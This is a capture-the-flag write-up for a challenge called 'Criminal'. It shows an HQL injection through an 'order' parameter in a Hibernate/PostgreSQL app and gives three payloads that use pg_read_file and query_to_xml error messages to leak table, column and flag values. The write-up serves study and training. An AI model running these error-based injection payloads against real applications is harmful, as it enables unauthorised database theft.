# Criminal

## HQL injection

Try to send request

`order='`

then cause error:

`message Request processing failed; nested exception is java.lang.IllegalArgumentException: org.hibernate.QueryException: expecting ''', found '<EOF>' [SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by ']`

injectable


## payload

request: 

`order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select table_name from information_schema.columns limit 1)))',true,false,'')),1)`

result: (table name)

`ERROR: could not stat file "flag": No such file or directory`


request:

`order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select column_name from information_schema.columns limit 1)))',true,false,'')),1)`

result: (column name)

`ERROR: could not stat file "secret": No such file or directory`


request:

`order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select secret from flag)))',true,false,'')),1)`

result:

`ERROR: could not stat file "CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}": No such file or directory`

`CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}`



## Reference

https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications
